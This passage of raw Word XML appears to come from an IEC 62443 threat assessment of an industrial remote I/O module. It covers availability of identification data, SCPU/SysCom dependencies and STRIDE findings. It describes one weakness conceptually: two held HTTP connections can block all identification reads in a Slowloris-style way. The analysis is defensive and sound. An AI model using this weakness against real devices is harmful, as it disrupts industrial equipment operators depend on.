        <w:t xml:space="preserve"> supporting.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Generalized flood/DoS → RQ-010.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId157" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId158" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3631B064" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538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866"/>
        <w:gridCol w:w="6424"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="6F6CBB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48C38C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8295D2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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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BA6977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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="116B0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BF2E4" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Asset H – IoT-Core </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>availability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1D917" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0001553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20D09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t>Correct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primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="58396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3429E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Asset D – identification data ("at all times")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F8AE7" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0001553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0A227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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>note</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>split</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>sourcing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>: host FW/CPU-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>bootloader</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> = COM-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>sourced</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (EEPROM); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>scpuversion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>scpubootloaderversion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> = SCPU-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>sourced</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> via </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (SRIO-2946). </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">During an SCPU flash the SCPU-sourced identifiers are unavailable even if HTTP answers. </w:t>
            </w:r>
            <w:hyperlink r:id="rId159" w:history="1">
              <w:r w:rsidRPr="00015538">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00015538">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00015538">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="7A4E0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DD3F3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Asset F – Domain separation (availability dependency)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8E319" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538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D1D68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Keep, but re-scoped to reliability/redundancy</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — SCPU-sourced identification depends on </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-21357); a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> timeout removes safe-side identification while the safety function continues (availability </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>inversion</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">). This is a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>reliability</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> dependency of RQ-007, </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> an attack surface (attack-induction → RQ-010).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F0DBD7E" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">STRIDE — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>corrected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2B4FC8" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Inherent unavailability / loss of availability (primary — design/reliability).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The dominant failing is the device's own operating states, not an attacker.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(STRIDE labels this under Denial-of-Service broadly, but the cause is design, not malice — state this explicitly.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A090A9" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Self-inflicted DoS (secondary — the one attack-adjacent, RQ-007-specific vector).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2-connection cap</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-7909) is a CR 7.1 mechanism that </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>doubles as a CR 7.1 weakness</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — two held connections block all further identification reads, with </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no attacker bandwidth needed</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-style, no documented session timeout).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DA7789" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:del w:id="23" w:author="Unknown">
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Generalized malicious DoS (flooding)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>→ RQ-010.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1328C24D" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">1.3 Security </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Functions</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp; Gaps — Cross-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Referenced</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1DB2BD72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Mitigations confirmed; accessibility control added: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2039"/>
        <w:gridCol w:w="4178"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="493185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1A7E1A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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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64946C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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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9EB925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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Effect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="7FA23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D90E1" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Max 2 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>concurrent</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> HTTP </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>connections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BBF09" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>SRIO-7909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C980F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Resource-exhaustion cap (CR 7.1/7.2) — </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the self-DoS vector </w:t>
            </w:r>
            <w:hyperlink r:id="rId160" w:history="1">
              <w:r w:rsidRPr="00E55DD7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E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E55DD7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015538" w:rsidRPr="00015538" w14:paraId="4F60B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3D605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lastRenderedPageBreak/>
              <w:t>Incoming-only, no outgoing/subscription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62F7E" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>SRIO-7908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8DF05" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Surface </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>reduction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (CR 7.7) </w:t>
            </w:r>
            <w:hyperlink r:id="rId161" w:history="1">
              <w:r w:rsidRPr="00015538">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00015538">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00015538">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="786FC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84533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IoT-Core Visualizer (browser, by IP)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38913" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>SRIO-7914/7913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E65B0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The**"easily accessible form"** — accessibility limb </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>largely MET</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId162" w:history="1">
              <w:r w:rsidRPr="00E55DD7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E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E55DD7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015538" w:rsidRPr="00E55DD7" w14:paraId="45A23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02767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HTTP served by </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>non-safety COM (QM)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> only, no redundancy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48172" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">SRIO-2100; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>SysArch</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> COM = QM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6C2F6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Single point of failure for availability </w:t>
            </w:r>
            <w:hyperlink r:id="rId163" w:history="1">
              <w:r w:rsidRPr="00E55DD7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E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId164" w:history="1">
              <w:r w:rsidRPr="00E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E55DD7">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E55DD7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</w:tbl>
    <w:p w14:paraId="7BCA9E9D" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>availability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>accessibility-scoped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2733E778" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
